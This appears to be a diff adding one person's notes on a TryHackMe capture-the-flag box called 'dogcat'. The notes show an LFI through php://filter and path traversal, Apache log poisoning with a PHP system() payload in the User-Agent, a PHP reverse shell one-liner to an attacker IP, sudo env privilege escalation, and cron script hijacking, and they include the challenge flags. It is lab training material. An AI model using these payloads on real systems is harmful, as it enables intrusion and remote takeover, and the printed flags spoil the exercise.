@@ -1,0 +1,105 @@
+vuln to LFI
+===========
+http://10.10.203.90/?view=/etc/passwd
+
+but problem found:
+-must have cat/dog in text
+-there's ".php" truncate behind
+
+tried:
+
+//%00 = null byte
+http://10.10.203.90/?view=/etc/passwd%00cat //shows fail opening '/etc/passwd' for inclusion
+
+php://filter/convert.base64-encode/resource=dog //this works!
+//output: !PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
+
+
+//to remove .php appending => try path truncation attack '/.' or '%00'
+
+
+interesting file/directory found
+===========================
+/flag.php
+/cat.php
+/dog.php
+/cats
+/dogs
+
+used /?view=php://filter/convert.base64-encode/resource=dogs/../index to get php code(LFI vuln)
+===============================================================================================
+<?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
+            if(isset($_GET['view'])) {
+                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+                    echo 'Here you go!';
+                    include $_GET['view'] . $ext;
+                } else {
+                    echo 'Sorry, only dogs or cats are allowed.';
+                }
+            }
+        ?>
+
+to get something different extension
+====================================
+//the code shows extension got from $ext, and it have $_GET["ext"] which we can abuse to 
+//change the ext
+php://filter/convert.base64-encode/resource=dogs/../../../../../../../etc/passwd&ext=
+
+1st flag(/flag.php)
+-------------------
+-it must be cat or dog in ?view= string
+-ending must be .php
+-php://filter/convert.base64-encode/resource=dogs/../flag
+or this dogs/../../../../../../../../../../../../../../etc/passwd
+//enter into dogs directory(have dog string), then get out and call flag since .php will be auto append
+
+getting foothold via LFI & log poisoning
+========================================
+/*
+this case we cant poison /proc/self/environ, so we poison apache access log since this run apache server
+
+apache log => /var/log/apache2/access.log
+
+when we see this log, we saw that the user-agent will be shown in the access.log, we try to inject php code through User-Agent
+
+//eg output from apache access.log
+10.9.23.162 - - [19/Apr/2020:06:50:18 +0000] "GET /dogs/9.jpg HTTP/1.1" 200 19716 "http://10.10.112.31/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0)
+//from:
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+to:
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd'])?> Gecko/20100101
+*/
+-then we inject php reverse shell to the $cmd
+//php -r '$sock=fsockopen("10.9.23.162",18890);exec("/bin/sh -i <&3 >&3 2>&3");'
+//remember to encode it to url
+
+
+2nd flag
+========
+-flag in /var/www directory
+//THM{LF1_t0_RC3_aec3fb}
+
+3rd flag
+========
+-check sudo -l
+//found sudo nopassword binary
+User www-data may run the following commands on cfb9eb13966a:
+    (root) NOPASSWD: /usr/bin/env
+-gtfobins => sudo /usr/bin/env /bin/sh
+-flag3.txt in /root
+//THM{D1ff3r3nt_3nv1ronments_874112}
+
+4th flag
+=======
+-found a backup file in /opt/backups
+-a backup.tar that updated each minute
+-found a script that does the job (so assuming that the real dogcat user that execute the script)
+-so change the content of script to bash reverse shell script and open a netcat listener
+-when the next minutes strikes the netcat will response with the reverse shell of dogcat host
+-grab flag4
+//THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
+
